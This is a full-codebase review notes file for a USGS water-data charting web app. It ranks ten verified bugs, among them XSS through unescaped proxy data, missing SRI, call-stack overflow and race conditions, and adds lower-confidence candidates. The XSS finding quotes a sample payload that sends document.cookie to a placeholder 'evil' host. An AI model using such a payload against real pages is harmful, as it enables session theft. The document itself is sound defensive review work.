# Full codebase review — findings (2026-08-14)

Git state at time of review: `origin/main` @ `da25081` (working tree clean, nothing
uncommitted). This review covered the **entire codebase** (index.html,
css/styles.css, js/main.js — ~1988 lines total), not a diff — it followed the prior
session's zoom/pan/reset bugfix work (commits `746c187`..`da25081`), all of which is
already merged and unrelated to what's below.

**Methodology:** two independent review passes run as fresh subagents with no prior
session context (one focused on js/main.js correctness, one on security/HTML/CSS),
then every finding from both was manually re-verified against the actual current
file contents (grep + Read) before being written down here. Findings are split into
**Verified** (confirmed or plausible-and-mechanism-checked by direct code reading)
and **Additional candidates** (raised by the review agents but not yet individually
re-verified — worth a look but lower confidence / lower priority).

Nothing below has been fixed yet. This file exists so the review survives a context
clear — resume by working through "Verified findings" in order, then decide whether
"Additional candidates" are worth pursuing.

---

## Verified findings (ranked most severe first)

### 1. XSS via unescaped `siteName` from USGS data routed through untrusted proxies
**Files:** `js/main.js:506`, `js/main.js:781`, `js/main.js:912`
**Verdict:** CONFIRMED (read all three sink sites directly)

`station.siteName` originates from `timeSeries.sourceInfo.siteName` in the JSON
response (`js/main.js:655`) — but that response is fetched **through** one of two
public, unauthenticated, third-party CORS proxies (`thingproxy.freeboard.io` or
`corsproxy.io`, see `fetchWithMultipleProxies` around `js/main.js:810-872`), neither
of which is controlled by this app or by USGS. `siteName` is then interpolated
**unescaped** into three `innerHTML`/`bindPopup` sinks:
- Leaflet marker popup: `marker.bindPopup(\`...<strong>${siteName}</strong>...\`)` (line 506)
- Current-values card: `cardDiv.innerHTML = \`...${station.siteName}...\`` (line 781)
- Chart header: `chartDiv.innerHTML = \`...${station.siteName}...\`` (line 912)

**Failure scenario:** a compromised/misbehaving proxy (or a MITM on the proxy's own
infra) returns `siteName` as `<img src=x onerror=fetch('https://evil/steal?c='+document.cookie)>`.
It executes in the victim's page the instant they fetch data for that station — no
user-typed input involved at all. Contrast with the station ID input, which *is*
regex-validated (`^[0-9]{8,15}$`, `js/main.js:81`) before use.

**Fix direction:** escape `siteName` (and any other API-sourced string reaching a
DOM sink) before interpolating into `innerHTML`, or build these DOM fragments with
`textContent`/`createElement` instead of template-literal HTML. A single small
`escapeHtml()` helper used at all three (four, see also finding #9 below) sink sites
would close this.

---

### 2. No Subresource Integrity on core CDN scripts
**File:** `index.html:9-13`
**Verdict:** CONFIRMED (read the `<head>` directly)

Chart.js, chartjs-plugin-zoom, moment.js, and chartjs-adapter-moment are all loaded
from `cdnjs.cloudflare.com` with plain `<script src=...>` — no `integrity=`/
`crossorigin=` attributes. Leaflet (lines 16-19), loaded right below them, *does*
have SRI hashes — so the pattern is already established in this file, just not
applied consistently.

**Failure scenario:** if cdnjs is compromised or an edge is poisoned, arbitrary JS
runs with full page privileges and there's no hash to detect the tampering against.

**Fix direction:** add `integrity`/`crossorigin` attributes to the four CDN
`<script>` tags, matching the pattern already used for Leaflet. cdnjs publishes SRI
hashes on its own site for every hosted file/version.

---

### 3. `Math.min(...values)`/`Math.max(...values)` spread can throw on large datasets
**File:** `js/main.js:884-885` (inside `createIndividualCharts`)
**Verdict:** CONFIRMED (read the function; confirmed `getDataTimeRange` exists specifically to avoid this)

```js
const min = Math.min(...values);
const max = Math.max(...values);
```

The file already has `getDataTimeRange` (`js/main.js:247-256`) with an explicit
comment: *"Find the min/max timestamp in a data array without spreading it into
Math.min/max (spread blows the call stack once a station's merged history gets
large)"* — but that helper is only used for the **x** (time) range elsewhere; the
**y**-value min/max stats computed here for the chart header stats row still use
the unguarded spread form.

**Failure scenario:** user selects a wide date range (or accumulates a lot of data
via repeated pan/zoom backfills — see the merge logic fixed earlier this session) —
100k+ points is achievable for a high-frequency parameter like Discharge over a
multi-year range. `Math.min(...values)` throws `RangeError: Maximum call stack size
exceeded`, and since this runs inside `stationData.forEach(...)` in
`createIndividualCharts`, it aborts rendering for that station and any remaining
stations in the same call.

**Fix direction:** replace with a manual loop (same pattern as `getDataTimeRange`),
or reuse/generalize that helper to also return y min/max in one pass.

---

### 4. `calculateTrend` divides by zero when the first sampled value is 0
**File:** `js/main.js:593` (function starts `js/main.js:586`)
**Verdict:** CONFIRMED (read the function; confirmed no zero-guard, contrasted with `detectRapidIncrease`'s guard)

```js
const percentChange = ((lastValue - firstValue) / firstValue) * 100;
```

No guard against `firstValue === 0`. `detectRapidIncrease` (a different function,
same file) explicitly skips `basePoint.y <= 0` at `js/main.js:539` — this function
doesn't have the equivalent check.

**Failure scenario:** Discharge (`00060`) can legitimately read 0 (dry channel /
no flow). If the first of the "last 10 points" sampled is 0 and flow later rises,
`percentChange` evaluates to `Infinity`, and the current-values card displays
"Rising (+Infinity%)" verbatim to the user.

**Fix direction:** guard `firstValue === 0` similarly to `detectRapidIncrease`
(e.g., skip/return a neutral trend, or use absolute delta instead of percent when
the baseline is zero).

---

### 5. Live parameter-dropdown read during backfill can merge wrong-parameter data into the visible chart
**File:** `js/main.js:340` (inside `fetchAdditionalDataIfNeeded`)
**Verdict:** PLAUSIBLE (mechanism traced and timing window confirmed real; requires a specific race to trigger, not reproduced live)

```js
const parameter = document.getElementById('parameterSelect').value;
```

This reads the dropdown's **live** value at the moment the backfill fetch executes,
not the value that the `stationData`/`chart` being backfilled were originally built
for. There is no per-station "which parameter is this data for" tag checked before
`mergeStationData` merges the result into `stationData.data` (`js/main.js:361`).

**Failure scenario (traced, not empirically reproduced):** user pans a Discharge
chart, starting the 200ms debounced `handleChartViewChange` → `fetchAdditionalDataIfNeeded`.
Before that fetch resolves (proxied network round-trips can easily exceed 200ms),
the user switches the parameter dropdown to Gage Height. `onParameterChange`'s own
`fetchDataAsync` is *also* async and hasn't rebuilt `charts`/`allStationData` yet —
so the old chart and `stationData` object are still the live, displayed ones when
the pending backfill's `fetchAdditionalDataIfNeeded` reads the now-changed dropdown
value, fetches Gage Height data, and merges it into what's still being treated (and
possibly still rendered before the rebuild lands) as a Discharge series.

**Fix direction:** capture the parameter value once, at the point the pan/zoom
triggers (or when `stationData` is created), and pass it through explicitly rather
than re-reading the DOM live inside the backfill fetch. Also consider tagging
`stationData` with the parameter it was fetched for and asserting it matches before
merging.

---

### 6. `handleChartViewChange` doesn't re-validate its chart after awaiting a fetch
**File:** `js/main.js:227-238`
**Verdict:** PLAUSIBLE (gap confirmed by reading; exact Chart.js post-destroy throw behavior not empirically verified)

```js
async function handleChartViewChange(chart) {
    const stationIndex = charts.indexOf(chart);
    if (stationIndex < 0 || stationIndex >= allStationData.length) return;
    const stationData = allStationData[stationIndex];
    if (displayMode === 'timeseries') {
        await fetchAdditionalDataIfNeeded(chart, stationData);
    }
    renderVisibleWindow(chart, stationData);   // <-- no re-check here
}
```

The `charts.indexOf(chart)` guard only runs **once**, before the `await`. If the
chart gets destroyed (via `createIndividualCharts`'s `chart.destroy()` +
`charts = []`) while the `await` is pending — e.g. the same parameter-switch race
as finding #5 — `renderVisibleWindow(chart, stationData)` runs against a destroyed
Chart.js instance with no re-validation. This function is invoked fire-and-forget
(via `setTimeout` in `onChartViewChanged`, or directly from reset/dblclick
handlers) with no `.catch`, so any resulting error becomes an unhandled promise
rejection.

**Fix direction:** re-check `charts.indexOf(chart) >= 0` (or equivalent) after the
`await`, before calling `renderVisibleWindow`, and bail out silently if the chart is
no longer live.

---

### 7. Map markers accumulate without cleanup on re-fetch / parameter switch
**File:** `js/main.js:512` (`addStationToMap`), compare `js/main.js:96-107` (`removeStation`, the only place markers are ever removed)
**Verdict:** CONFIRMED (read `addStationToMap` and confirmed no marker removal happens outside explicit user-initiated `removeStation`)

`addStationToMap` always does `stationMarkers.push({...})` for a fresh Leaflet
marker — there's no check for (or removal of) an existing marker for the same
`stationId` before adding a new one. The **only** place a marker is ever removed is
`removeStation`, which only fires when the user explicitly removes a station from
the selected-stations list.

**Failure scenario:** user fetches data for a station, then switches the parameter
dropdown a few times (each switch re-runs `fetchDataAsync` → `addStationToMap` for
the same station). After 5 switches, 5 stacked, overlapping marker layers/popups
exist at the same map coordinate, growing unbounded over a long session.

**Fix direction:** in `addStationToMap` (or just before calling it in
`fetchDataAsync`), remove any existing marker for that `stationId` before adding
the new one — same pattern already used in `removeStation`.

---

### 8. `chartsGrid` inline `display:block` never resets to the CSS grid layout
**File:** `js/main.js:627` (sets `display:block`), compare `js/main.js:52` (`setDisplayMode`, the only place `display:grid` is set) and `css/styles.css:470-475` (the `.charts-grid` class, which specifies `display: grid`)
**Verdict:** CONFIRMED (read all three sites; confirmed inline style beats the class rule)

`fetchDataAsync` sets `chartsGrid.style.display = 'block'` for the loading spinner
state (line 627). Nothing resets it to `'grid'` afterward — the only code path that
sets `display:grid` on this element is `setDisplayMode()` (line 52), which only
runs if the user clicks the mode-switch buttons. Since "Time Series" mode is
already active by default, that path is never exercised on a normal first fetch,
and the inline style (higher specificity than the `.charts-grid` class rule) wins.

**Failure scenario:** user adds 2+ stations and clicks "Fetch & Visualize Data"
without touching the mode buttons — charts stack full-width in block flow instead
of the intended responsive side-by-side grid (`grid-template-columns:
repeat(auto-fit, minmax(600px, 1fr))`).

**Fix direction:** after `createIndividualCharts` populates the grid (or right
before calling it), explicitly set `chartsGrid.style.display = 'grid'` — or better,
remove the inline style entirely once loading is done and let the CSS class govern
it (only need `display:block`/`none` toggling for the loading-spinner and
hidden states, not `grid` — that's what the stylesheet is for).

---

### 9. Mode-switch buttons are not keyboard-operable
**File:** `index.html:72`, `index.html:76`
**Verdict:** CONFIRMED (read the markup directly; confirmed no `role`/`tabindex`/keydown handler anywhere)

```html
<div class="mode-button active" id="timeSeriesBtn" onclick="setDisplayMode('timeseries')">
<div class="mode-button" id="currentBtn" onclick="setDisplayMode('current')">
```

Plain `<div>`s with only a click handler — no `role="button"`, no `tabindex`, no
`keydown`/`keypress` handling for Enter/Space, and `main.js` registers no
supplementary listener for them.

**Failure scenario:** a keyboard-only or screen-reader user tabbing through the page
cannot reach or activate these controls at all — they're invisible to the
accessibility tree as interactive elements.

**Fix direction:** either convert to real `<button>` elements (simplest, gets
keyboard/AT support for free), or add `role="button" tabindex="0"` plus a
`keydown` handler for Enter/Space if the `<div>` styling must be preserved.

---

### 10. Y-axis is unconditionally floored at 0, clipping negative Temperature readings
**File:** `js/main.js:213` (inside `renderVisibleWindow`)
**Verdict:** CONFIRMED (read the line; confirmed Temperature is a supported parameter with values that can legitimately go negative)

```js
chart.options.scales.y.min = Math.max(0, visibleMin - padding);
```

This assumes all parameter values are non-negative. `parameterConfigs` includes
Temperature (`00010`, °C) — stream/air temperature sensors can read at or below 0°C
during cold conditions (icing, calibration drift near freezing).

**Failure scenario:** a station's temperature data dips to -0.5°C during a cold
snap. The visible window's true minimum is negative, but the Y-axis is still
floored at 0, visually flattening/cutting off the actual low readings —
misrepresenting the data range for that parameter specifically (the clamp is
correct for Discharge/Gage Height/Turbidity, which are inherently non-negative, but
not for Temperature).

**Fix direction:** only apply the `Math.max(0, ...)` floor for parameters known to
be non-negative (e.g., check `station.parameterConfig` or the parameter code),
or drop the floor and let the padding-based min stand for all parameters.

---

## Additional candidates (raised by review agents, not yet individually re-verified)

These came out of the same two review passes but weren't cross-checked against the
live code as carefully as the ten above. Worth a look, likely lower priority/effort,
but treat as "reported, not confirmed" until read directly.

- **Decimation can silently drop the exact point flagged as a rapid-increase alert**
  (`decimateMinMax`, `js/main.js:128-156`, used at `~216-219` and `~943-944`) — the
  alert list/header could report an alert whose point isn't actually visible on the
  rendered (decimated) line, since decimation keeps each bucket's min/max-*y* point,
  not necessarily the point `detectRapidIncrease` flagged.
- **`stationDataRanges` is declared and read but never written** (`js/main.js:8`
  declaration, `~312` only read site) — dead state; the per-station "earliest known
  date" optimization it implies is permanently a no-op, always falling back to the
  hardcoded 1889 floor.
- **Initial fetch doesn't sort `chartData`** before assigning to `station.data`
  (`js/main.js:~660-665`), unlike the backfill path (`mergeStationData`, which
  explicitly sorts). If the USGS IV service or a proxy ever returned out-of-order
  values on the *initial* fetch, decimation bucket-contiguity, "last 10 points"
  trend calc, and the "Latest" stat would all silently misbehave. Not observed in
  practice (USGS IV responses are chronological), just an unenforced assumption.
- **No Content-Security-Policy meta tag** in `index.html` — combined with finding
  #1, an injected payload runs completely unmitigated. A CSP restricting
  `script-src`/blocking inline event handlers would raise the bar even without
  fixing #1 directly.
- **Public CORS proxy trust/information-exposure** (`js/main.js:~810-872`) — every
  query (station IDs, parameter codes, date ranges) and full response payload
  passes through two free, third-party, no-SLA proxy services with unknown logging
  practices. Not fixable without a first-party proxy, but worth knowing as a
  standing trust-boundary decision, not a bug.
- **Color-contrast failures on trend indicators** (`css/styles.css:401-402`)
  `.trend-up`/`.trend-down` colors reportedly fail WCAG AA contrast against a white
  background — not independently re-measured.
- **Missing `<label>` association for `#stationInput` and `#parameterSelect`**
  (`index.html:33`, `:45`) — unlike `#startDate`/`#endDate`, which do use
  `<label for="...">` correctly.
- **Unescaped error message interpolated into `innerHTML`**
  (`js/main.js:741, 743`) — currently all `error.message` values are
  developer-authored strings, so no live exploit path was found, but
  `response.statusText` (from the untrusted proxy response, `~842`) does flow into
  this same sink unescaped — same pattern as finding #1, lower current risk since
  the content is more constrained.
- **No client-side check that start date ≤ end date** (`js/main.js:~617-624`) —
  correctness/UX gap, not a security issue; produces a confusing empty-result error
  from USGS instead of a clear inline validation message.
- One review pass explicitly checked for **recurrence of the duplicate
  inline-onclick-plus-addEventListener bug** (the exact pattern fixed earlier this
  session for the parameter dropdown) across `addStation`/`fetchData`/
  `setDisplayMode`/`removeStation` and found no other instances — confirmed via a
  targeted grep during write-up of this doc as well. No action needed here.

---

## Next step when resuming

Work through "Verified findings" 1-10 in order (already ranked by severity); decide
per-item whether to fix now or explicitly defer, the same way the two efficiency
items were triaged and closed out in the previous zoom/pan session. Then decide
whether any "Additional candidates" are worth a proper look. Delete or fold this
file into commit messages once its contents are addressed, following the same
pattern used for `ZOOM_WORK_NOTES.md` earlier this project.
